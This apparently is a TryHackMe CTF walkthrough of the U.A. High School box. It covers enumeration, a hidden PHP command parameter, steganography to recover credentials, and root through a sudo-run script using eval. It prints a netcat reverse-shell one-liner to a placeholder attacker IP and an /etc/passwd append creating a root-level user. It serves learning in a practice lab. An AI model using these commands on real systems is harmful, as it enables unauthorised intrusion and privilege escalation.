---
title: "TryHackMe U.A. High School — Walkthrough"
date: 2025-12-02 14:20:00 +0300
categories: [TryHackMe, Web]
tags: [rce, steganography, steghide, sudo, arbitrary-write]
pin: false
---

U.A. High School starts with a hidden **`/assets/index.php`** command parameter, moves through **steganography** for **`deku`** credentials, and ends with **arbitrary file write** via a **`sudo`**-backed feedback script.

## Initial Enumeration

### Nmap scan

```bash
nmap -T4 -n -sC -sV -Pn -p- <TARGET_IP>
```

| Port | Service |
| ---- | ------- |
| 22 | OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 |
| 80 | Apache 2.4.41 — title: U.A. High School |

### Web 80

Main site pages are static. The contact form at `/contact.html` yielded nothing useful on testing.

## Shell as www-data

CSS references `/assets/images/yuei.jpg`, exposing **`/assets`** and **`/assets/images`**.

- `/assets/` returns empty body but sets **`PHPSESSID`** — likely **`index.php`**, not directory listing.
- `/assets/index.php` → **200**; `/assets/index.html` → **404**.

Fuzz parameters:

```bash
ffuf -u 'http://<TARGET_IP>/assets/index.php?FUZZ=id' \
  -mc all -ic -t 100 \
  -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt \
  -fs 0
```

Discovered parameter: **`cmd`**.

```bash
curl -s 'http://<TARGET_IP>/assets/index.php?cmd=id'
dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK
```

Base64 decode → `uid=33(www-data)...`

Reverse shell:

```bash
nc -lvnp 443
curl -s 'http://<TARGET_IP>/assets/index.php' -G \
  --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc <ATTACKER_IP> 443 >/tmp/f'
```

## Shell as deku

### Hidden content and steganography

`/var/www/Hidden_Content/passphrase.txt`:

```bash
cat passphrase.txt | base64 -d
AllmightForEver!!!
```

Unused image **`oneforall.jpg`** under `/var/www/html/assets/images/` fails to open — magic bytes are **PNG** despite `.jpg` extension:

```text
00000000: 8950 4e47 ...  .PNG
```

`steghide` rejects PNG. Patch header to **JPEG** magic with **`hexeditor -b`**, then:

```bash
steghide extract -sf oneforall.jpg
# passphrase: AllmightForEver!!!
# wrote extracted data to "creds.txt"
```

`creds.txt`:

```text
deku:[REDACTED]
```

```bash
ssh deku@<TARGET_IP>
deku@myheroacademia:~$ wc -c user.txt
33 user.txt
```

## Shell as root

### sudo feedback.sh arbitrary write

```bash
sudo -l
User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
```

Script owned by **`deku`** but immutable flag **`i`** prevents editing:

```bash
lsattr /opt/NewComponent/feedback.sh
----i---------e----- /opt/NewComponent/feedback.sh
```

The script reads feedback and runs **`eval "echo $feedback"`** after blocking `` ` ``, `)`, `$(`, `|`, `&`, `;`, `?`, `!`, `\` — but **`>`** and **`/`** are allowed.

Proof:

```text
Enter your feedback: test > /tmp/test.txt
```

Creates **`/tmp/test.txt`** owned by **root**.

Create MD5 crypt hash:

```bash
mkpasswd -m md5crypt -s
# Password: 123 → $1$MgMMCplp$bx1JXnOEyOXMkHf9VnHgK0
```

Append UID-0 user via sudo script:

```text
'jxf:$1$MgMMCplp$bx1JXnOEyOXMkHf9VnHgK0:0:0:jxf:/root:/bin/bash' >> /etc/passwd
```

(Single quotes protect `$` in the hash.)

```bash
su - jxf
root@myheroacademia:~# wc -c root.txt
794 root.txt
```

## Takeaways

- **`PHPSESSID` on empty `/assets/`** hints at **`index.php`** masquerading as a directory.
- **Magic-byte mismatches** break stego tools until headers are repaired.
- **`eval` with partial blacklists** still allows redirection-based **root file write**.
